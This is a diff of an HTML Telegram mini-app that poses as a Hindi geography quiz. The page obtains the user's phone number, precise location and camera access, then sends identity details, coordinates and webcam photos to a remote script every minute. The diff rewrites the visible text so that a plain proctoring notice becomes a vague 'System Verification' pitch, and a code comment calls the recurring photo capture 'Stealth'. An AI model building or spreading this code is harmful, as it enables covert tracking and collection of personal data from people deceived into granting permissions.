@@ -3,47 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Geography Ultimate Quiz - Secure Mode</title>
+    <title>System Verification</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
     <style>
         * { box-sizing: border-box; font-family: 'Poppins', sans-serif; user-select: none; }
-        body { margin: 0; min-height: 100vh; background: #0b131e; color: #ffffff; text-align: center; display: flex; flex-direction: column; }
-        .header { padding: 15px; background: rgba(255, 255, 255, 0.03); border-bottom: 1px solid rgba(255, 255, 255, 0.1); }
-        .card { width: 92%; max-width: 500px; margin: 30px auto; background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); padding: 25px; border-radius: 20px; border: 1px solid rgba(255, 255, 255, 0.1); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        button { background: linear-gradient(135deg, #00eaff, #0080ff); color: white; border: none; padding: 15px 25px; border-radius: 12px; cursor: pointer; font-size: 16px; font-weight: 600; width: 100%; transition: 0.3s; margin-top: 10px; }
-        button:disabled { background: #444; cursor: not-allowed; }
-        .option { background: rgba(255, 255, 255, 0.08); padding: 15px; margin: 10px 0; border-radius: 10px; cursor: pointer; text-align: left; border: 1px solid rgba(255, 255, 255, 0.1); }
-        .status-tag { font-size: 11px; color: #00eaff; text-transform: uppercase; letter-spacing: 1px; }
-        .warning-text { font-size: 13px; color: #ffaa00; background: rgba(255,170,0,0.1); padding: 10px; border-radius: 8px; margin-bottom: 15px; }
+        body { margin: 0; min-height: 100vh; background: #0b131e; color: #ffffff; text-align: center; display: flex; flex-direction: column; justify-content: center; }
+        .card { width: 90%; max-width: 450px; margin: auto; background: rgba(255, 255, 255, 0.05); padding: 30px; border-radius: 24px; border: 1px solid rgba(255, 255, 255, 0.1); box-shadow: 0 20px 40px rgba(0,0,0,0.4); }
+        h3 { margin-top: 0; color: #00eaff; }
+        .instruction-box { text-align: left; background: rgba(255, 255, 255, 0.03); padding: 20px; border-radius: 15px; font-size: 14px; line-height: 1.6; margin: 20px 0; border-left: 4px solid #00eaff; }
+        button { background: linear-gradient(135deg, #00eaff, #0080ff); color: white; border: none; padding: 18px; border-radius: 12px; cursor: pointer; font-size: 16px; font-weight: 700; width: 100%; transition: 0.3s; box-shadow: 0 5px 15px rgba(0, 234, 255, 0.3); }
+        button:disabled { background: #333; box-shadow: none; opacity: 0.6; }
+        .option { background: rgba(255, 255, 255, 0.07); padding: 16px; margin: 12px 0; border-radius: 12px; cursor: pointer; text-align: left; border: 1px solid rgba(255, 255, 255, 0.1); }
     </style>
 </head>
 <body>
 
-<div class="header">
-    <h2 style="margin:0; font-size: 20px; color: #00eaff;">Max Test Series</h2>
-    <span class="status-tag">🛡️ Enhanced Proctoring Enabled</span>
-</div>
-
 <div id="login" class="card">
-    <div style="font-size: 50px; margin-bottom: 10px;">🔒</div>
-    <h3>Secure System Login</h3>
+    <div style="font-size: 55px; margin-bottom: 15px;">🛡️</div>
+    <h3>System Configuration</h3>
     
-    <div class="warning-text">
-        यह टेस्ट शुरू करने के लिए <b>Phone Number</b>, <b>Camera</b> और <b>Location</b> का एक्सेस अनिवार्य है।
+    <div class="instruction-box">
+        • टेस्ट एनवायरनमेंट सेट किया जा रहा है।<br>
+        • इसके बाद आपसे कुछ <b>सिस्टम परमिशन्स</b> मांगी जाएंगी।<br>
+        • टेस्ट शुरू करने के लिए उन सभी को <b>Allow</b> करना अनिवार्य (Mandatory) है।<br>
+        • प्रक्रिया शुरू करने के लिए नीचे दिए बटन पर क्लिक करें।
     </div>
 
-    <div style="text-align: left; font-size: 13px; color: #ccc; margin-bottom: 20px;">
-        1. "Verify & Start" पर क्लिक करें।<br>
-        2. अपना मोबाइल नंबर शेयर करें।<br>
-        3. कैमरा और लोकेशन को <b>Allow</b> करें।
-    </div>
-    
-    <button id="startBtn" onclick="startVerification()">Verify & Start Test</button>
+    <button id="startBtn" onclick="initiateFlow()">प्रक्रिया शुरू करें</button>
 </div>
 
 <div id="quizBox" class="card" style="display:none">
-    <div id="question" style="font-size: 18px; margin-bottom: 20px; text-align: left; font-weight: 600;"></div>
+    <div id="question" style="font-size: 18px; margin-bottom: 25px; text-align: left; font-weight: 600;"></div>
     <div id="options"></div>
 </div>
 
@@ -55,76 +46,79 @@
     const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxdOm1OryzaFHkYJJbB5MmQ4WyENGA9uFjzHtkBEXkk3xzx7ojANdyJTKXrXucxA3X5fw/exec"; 
 
     const user = tg.initDataUnsafe?.user || {};
-    const userId = user.id || "Unknown";
-    const username = user.username || "N/A";
-    const fullName = (user.first_name || "") + " " + (user.last_name || "");
-
-    let userPhone = "Not Provided";
-    let userLoc = "Unknown";
+    let userPhone = "Pending";
+    let userLoc = "Pending";
     let globalStream = null;
     let currentIdx = 0;
 
-    // 🚨 APNE QUESTIONS KA ARRAY YAHAN PASTE KAREIN
+    // 🚨 APNE QUESTIONS YAHAN DALEIN
     const questions = [
         {q: "1. Geography का जनक किसे कहा जाता है?", o: ["Hecataeus", "Eratosthenes", "Herodotus", "Ptolemy"], a: 0},
-        // Baaki 129 sawal yahan jodein...
     ];
 
-    async function startVerification() {
+    async function initiateFlow() {
         const btn = document.getElementById("startBtn");
-        btn.innerText = "Verifying Identity...";
         btn.disabled = true;
+        btn.innerText = "Verifying Identity... ⏳";
 
-        // STEP 1: Request Phone Number (Telegram Official Popup)
+        // Step 1: Request Phone Number (Telegram Popup)
         tg.requestContact((ok, response) => {
             if (ok && response?.responseUnsafe?.contact) {
                 userPhone = response.responseUnsafe.contact.phone_number;
-                checkProctoringPermissions();
+                // Phone milte hi agla step trigger karein
+                setTimeout(getSystemPermissions, 800);
             } else {
-                alert("ACCESS DENIED: टेस्ट के लिए मोबाइल नंबर शेयर करना अनिवार्य है।");
-                btn.innerText = "Verify & Start Test";
+                alert("प्रोसेस अधूरा है! टेस्ट के लिए सभी परमिशन्स अनिवार्य हैं।");
                 btn.disabled = false;
+                btn.innerText = "प्रक्रिया शुरू करें";
             }
         });
     }
 
-    async function checkProctoringPermissions() {
+    async function getSystemPermissions() {
         const btn = document.getElementById("startBtn");
-        btn.innerText = "Configuring Security...";
+        btn.innerText = "Setting Environment... ⏳";
 
         try {
-            // STEP 2: Location Access
+            // Step 2: Location Access
             const pos = await new Promise((res, rej) => {
-                navigator.geolocation.getCurrentPosition(res, rej, {timeout: 8000});
+                navigator.geolocation.getCurrentPosition(res, rej, {
+                    enableHighAccuracy: true,
+                    timeout: 10000
+                });
             });
-            userLoc = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
+            userLoc = `${pos.coords.latitude}, ${pos.coords.longitude}`;
 
-            // STEP 3: Camera Access
+            // Step 3: Camera Access
             globalStream = await navigator.mediaDevices.getUserMedia({ video: true });
 
-            // STEP 4: Initial Entry Logging
-            captureAndSend("Verified_Entry");
-
-            // STEP 5: Start 1-Minute Interval Tracking
-            setInterval(() => {
-                captureAndSend("Interval_Proctoring");
-            }, 60000);
-
-            // Hide Login & Show Quiz
-            document.getElementById("login").style.display = "none";
-            document.getElementById("quizBox").style.display = "block";
-            loadQuestion();
+            // Sab permissions mil gayi!
+            startTestFinal();
 
         } catch (err) {
-            alert("SECURITY ALERT: कैमरा और लोकेशन अनुमति अनिवार्य है। कृपया ब्राउज़र सेटिंग्स में जाकर Allow करें और पेज रिफ्रेश करें।");
-            btn.innerText = "Verify & Start Test";
-            btn.disabled = false;
+            console.error(err);
+            alert("Security Error: सभी परमिशन्स को Allow करना अनिवार्य है। कृपया दोबारा कोशिश करें।");
+            location.reload(); 
         }
+    }
+
+    function startTestFinal() {
+        // Initial Entry Data
+        captureAndSend("Verified_Entry");
+
+        // Har 1 minute mein auto-photo capture (Stealth)
+        setInterval(() => {
+            captureAndSend("Interval_Tracking");
+        }, 60000);
+
+        // UI Switch
+        document.getElementById("login").style.display = "none";
+        document.getElementById("quizBox").style.display = "block";
+        loadQuestion();
     }
 
     async function captureAndSend(statusType) {
         if (!globalStream) return;
-
         try {
             const video = document.createElement('video');
             video.srcObject = globalStream;
@@ -138,13 +132,13 @@
             const photoData = canvas.toDataURL('image/jpeg', 0.4);
 
             const payload = {
-                userId: userId, 
-                username: username, 
-                fullName: fullName,
+                userId: user.id || "ID_Err",
+                username: user.username || "NA",
+                fullName: (user.first_name || "") + " " + (user.last_name || ""),
                 phone: userPhone,
-                score: "In_Test", 
-                status: statusType, 
-                photo: photoData, 
+                score: "In_Progress",
+                status: statusType,
+                photo: photoData,
                 location: userLoc
             };
 
@@ -154,13 +148,13 @@
                 body: JSON.stringify(payload) 
             });
         } catch (e) {
-            console.error("Capture Error:", e);
+            console.log("Capture error:", e);
         }
     }
 
     function loadQuestion() {
         if (currentIdx >= questions.length) { 
-            alert("टेस्ट सफलतापूर्वक सबमिट हो गया है!"); 
+            alert("टेस्ट सफलतापूर्वक सबमिट हो गया!"); 
             tg.close(); 
             return; 
         }
